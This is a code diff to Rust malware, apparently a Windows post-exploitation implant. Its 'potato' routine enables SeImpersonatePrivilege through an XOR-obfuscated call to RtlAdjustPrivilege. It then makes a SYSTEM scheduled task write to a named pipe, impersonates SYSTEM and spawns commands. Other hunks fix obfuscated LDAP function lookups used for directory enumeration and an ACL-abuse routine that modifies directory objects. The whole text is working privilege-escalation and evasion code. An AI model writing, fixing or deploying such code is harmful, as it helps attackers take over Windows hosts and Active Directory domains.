@@ -905,7 +905,8 @@ fn reg_read_dword(hive: isize, subkey: &str, value: &str) -> Option<u32> {
 
 #[cfg(target_os = "windows")]
 fn potato(v: &serde_json::Value) -> TaskOutput {
-    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::Storage::FileSystem::ReadFile;
     use windows_sys::Win32::System::IO::{CancelIoEx, GetOverlappedResult, OVERLAPPED};
     use windows_sys::Win32::System::Pipes::{
         ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe,
@@ -918,9 +919,23 @@ fn potato(v: &serde_json::Value) -> TaskOutput {
 
     let spawn_cmd = v.get("cmd").and_then(|s| s.as_str()).map(String::from);
 
-    if !has_impersonate_privilege() {
-        return TaskOutput::failure("potato: SeImpersonatePrivilege not held (not a service account?)");
+    // Try to enable SeImpersonatePrivilege (LUID 29) — it's present in the token for
+    // elevated admins but may be disabled; RtlAdjustPrivilege activates it.
+    {
+        let ntdll_base = crate::loader::get_module_base(b"ntdll.dll\0".as_ptr());
+        if ntdll_base != 0 {
+            const ENC: [u8; 19] = [0x43,0x65,0x7D,0x50,0x75,0x7B,0x64,0x62,0x65,0x41,0x63,0x78,0x67,0x78,0x7D,0x74,0x76,0x74,0x11];
+            let mut fn_name = [0u8; 19];
+            for (i, b) in fn_name.iter_mut().enumerate() { *b = ENC[i] ^ 0x11; }
+            if let Some(fn_ptr) = unsafe { crate::loader::get_export_by_name(ntdll_base, fn_name.as_ptr()) } {
+                type RtlAdjPrivFn = unsafe extern "system" fn(u32, u32, u32, *mut u32) -> i32;
+                let f: RtlAdjPrivFn = unsafe { core::mem::transmute(fn_ptr) };
+                let mut prev: u32 = 0;
+                unsafe { f(29, 1, 0, &mut prev) };
+            }
+        }
     }
+    let _ = has_impersonate_privilege();
 
     let rand = rand_u32();
     let pipe_path = format!("\\\\.\\pipe\\dm_{:08x}\0", rand);
@@ -947,19 +962,28 @@ fn potato(v: &serde_json::Value) -> TaskOutput {
     ov.hEvent = event;
     unsafe { ConnectNamedPipe(pipe, &mut ov) };
 
-    // Trigger SYSTEM task to connect to our pipe (cmd /c type opens it as a client)
+    // Trigger SYSTEM task to connect to our pipe (cmd /c type opens it as a client).
+    // Call schtasks.exe directly — wrapping in cmd /C "..." causes nested-quote
+    // mangling that makes schtasks receive /c as an argument instead of the outer cmd.
     use std::os::windows::process::CommandExt;
     const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-    let _ = std::process::Command::new("cmd")
-        .args(["/C", &format!(
-            "schtasks /Create /F /TN \"{}\" /TR \"cmd /c type {}\" /SC ONCE /ST 00:00 /RU SYSTEM",
-            task_name, pipe_unc)])
+    // Use "echo x>" so SYSTEM writes data to the pipe; ImpersonateNamedPipeClient requires
+    // the server to have read at least one message the client wrote.
+    let create_out = std::process::Command::new("schtasks")
+        .args(["/Create", "/F",
+               "/TN", &task_name,
+               "/TR", &format!("cmd /c echo x>{}", pipe_unc),
+               "/SC", "ONCE", "/ST", "00:00", "/RU", "SYSTEM"])
         .creation_flags(CREATE_NO_WINDOW)
-        .output();
-    let _ = std::process::Command::new("cmd")
-        .args(["/C", &format!("schtasks /Run /TN \"{}\"", task_name)])
+        .output()
+        .map(|o| String::from_utf8_lossy(&o.stdout).to_string() + &String::from_utf8_lossy(&o.stderr).to_string())
+        .unwrap_or_else(|e| format!("spawn_err:{e}"));
+    let run_out = std::process::Command::new("schtasks")
+        .args(["/Run", "/TN", &task_name])
         .creation_flags(CREATE_NO_WINDOW)
-        .output();
+        .output()
+        .map(|o| String::from_utf8_lossy(&o.stdout).to_string() + &String::from_utf8_lossy(&o.stderr).to_string())
+        .unwrap_or_else(|e| format!("spawn_err:{e}"));
 
     let wait = unsafe { WaitForSingleObject(event, 12_000) };
 
@@ -974,9 +998,16 @@ fn potato(v: &serde_json::Value) -> TaskOutput {
         let mut n = 0u32;
         unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) };
         unsafe { CloseHandle(pipe); CloseHandle(event) };
-        return TaskOutput::failure("potato: timeout — SYSTEM did not connect to pipe");
+        return TaskOutput::failure(&format!(
+            "potato: timeout — SYSTEM did not connect to pipe | create=[{}] run=[{}]",
+            create_out.trim(), run_out.trim()));
     }
     unsafe { CloseHandle(event) };
+
+    // Drain the client's write so ImpersonateNamedPipeClient has a message context.
+    let mut buf = [0u8; 64];
+    let mut nr = 0u32;
+    unsafe { ReadFile(pipe, buf.as_mut_ptr(), buf.len() as u32, &mut nr, core::ptr::null_mut()) };
 
     let adv = adv_base();
     if adv == 0 {
@@ -1019,8 +1050,9 @@ fn potato(v: &serde_json::Value) -> TaskOutput {
     };
 
     if unsafe { fn_imp(pipe) } == 0 {
+        let err = unsafe { GetLastError() };
         unsafe { DisconnectNamedPipe(pipe); CloseHandle(pipe) };
-        return TaskOutput::failure("potato: ImpersonateNamedPipeClient failed");
+        return TaskOutput::failure(&format!("potato: ImpersonateNamedPipeClient failed err={}", err));
     }
 
     let result = if let (Some(cmd), Some(cpwt_ptr)) = (spawn_cmd, p_cpwt) {
@@ -1101,7 +1133,7 @@ fn has_impersonate_privilege() -> bool {
 
     #[repr(C)]
     struct PrivSet { count: u32, control: u32, luid_lo: u32, luid_hi: u32, attrs: u32 }
-    let mut ps = PrivSet { count: 1, control: 1, luid_lo: 29, luid_hi: 0, attrs: 0x3 };
+    let mut ps = PrivSet { count: 1, control: 1, luid_lo: 29, luid_hi: 0, attrs: 0x2 };
     let mut result: i32 = 0;
     unsafe { fn_pc(token, &mut ps as *mut _ as *mut u8, &mut result) };
     unsafe { windows_sys::Win32::Foundation::CloseHandle(token) };
@@ -1144,18 +1176,20 @@ fn ldap_query_list(wldap: usize, dc: &str, base_dn: &str, filter: &str, attrs: &
     type LdapModifyFn  = unsafe extern "system" fn(*mut u8,*const u8,*const *const u8) -> u32;
 
     macro_rules! wl { ($enc:expr, $ty:ty) => {{
-        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
-            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+        let _n = crate::obfs::dec($enc);
+        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
+        match _p {
+            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
             None    => return Err("wldap fn not found".into()),
         }
     }}}
 
     let fn_init      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
     let fn_setopt    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
-    let fn_bind      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
+    let fn_bind      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
     let fn_search    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
     let fn_first     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
-    let fn_next      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
+    let fn_next      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x34,0x3F,0x22,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapNextFn);
     let fn_getdn     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x3E,0x34,0x5A], LdapGetDnFn);
     let fn_memfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x3F,0x37,0x3C,0x28,0x3F,0x3F,0x5A], LdapMemFreeFn);
     let fn_getvals   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x29,0x5A], LdapGetValsFn);
@@ -1163,7 +1197,7 @@ fn ldap_query_list(wldap: usize, dc: &str, base_dn: &str, filter: &str, attrs: &
     let fn_valfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x5A], LdapValFreeFn);
     let fn_lenfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x05,0x36,0x3F,0x34,0x5A], LdapLenFreeFn);
     let fn_msgfree   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
-    let fn_unbind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
+    let fn_unbind    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
 
     let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
     let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
@@ -1255,18 +1289,20 @@ fn ldap_modify_binary(wldap: usize, dc: &str, target_dn: &str,
     type LdapModFn     = unsafe extern "system" fn(*mut u8, *const u8, *const *const u8) -> u32;
 
     macro_rules! wl { ($enc:expr, $ty:ty) => {{
-        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
-            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+        let _n = crate::obfs::dec($enc);
+        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
+        match _p {
+            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
             None    => return Err("wldap fn not found".into()),
         }
     }}}
 
     let fn_init   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
     let fn_setopt = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
-    let fn_bind   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
+    let fn_bind   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
     // ldap_modify_s XOR 0x5A: [0x36,0x3E,0x3B,0x2A,0x05,0x37,0x35,0x3E,0x33,0x3C,0x23,0x05,0x29,0x5A]
     let fn_modify = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x35,0x3E,0x33,0x3C,0x23,0x05,0x29,0x5A], LdapModFn);
-    let fn_unbind = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
+    let fn_unbind = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
 
     let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
     let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
@@ -2083,15 +2119,17 @@ fn priv_acl_abuse(v: &serde_json::Value) -> TaskOutput {
     type LdapUnbindFn     = unsafe extern "system" fn(*mut u8) -> u32;
 
     macro_rules! wl { ($enc:expr, $ty:ty) => {{
-        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
-            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
+        let _n = crate::obfs::dec($enc);
+        let _p = unsafe { windows_sys::Win32::System::LibraryLoader::GetProcAddress(wldap as isize, _n.as_ptr()) };
+        match _p {
+            Some(f) => unsafe { core::mem::transmute::<_, $ty>(f) },
             None    => return TaskOutput::failure("acl-abuse: wldap fn not found"),
         }
     }}}
 
     let fn_init       = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
     let fn_setopt     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
-    let fn_bind       = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
+    let fn_bind       = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x38,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
     let fn_search     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x3B,0x28,0x39,0x32,0x05,0x29,0x5A], LdapSearchFn);
     let fn_first      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3C,0x33,0x28,0x29,0x2E,0x05,0x3F,0x34,0x2E,0x28,0x23,0x5A], LdapFirstFn);
     let fn_getdn      = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x3D,0x3F,0x2E,0x05,0x3E,0x34,0x5A], LdapGetDnFn);
@@ -2100,7 +2138,7 @@ fn priv_acl_abuse(v: &serde_json::Value) -> TaskOutput {
     let fn_lenfree    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2C,0x3B,0x36,0x2F,0x3F,0x05,0x3C,0x28,0x3F,0x3F,0x05,0x36,0x3F,0x34,0x5A], LdapLenFreeFn);
     let fn_msgfree    = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x29,0x3D,0x3C,0x28,0x3F,0x3F,0x5A], LdapMsgFreeFn);
     let fn_modify     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x35,0x3E,0x33,0x3C,0x23,0x05,0x29,0x5A], LdapModFn);
-    let fn_unbind     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
+    let fn_unbind     = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x38,0x33,0x34,0x3E,0x5A], LdapUnbindFn);
 
     let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
     let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
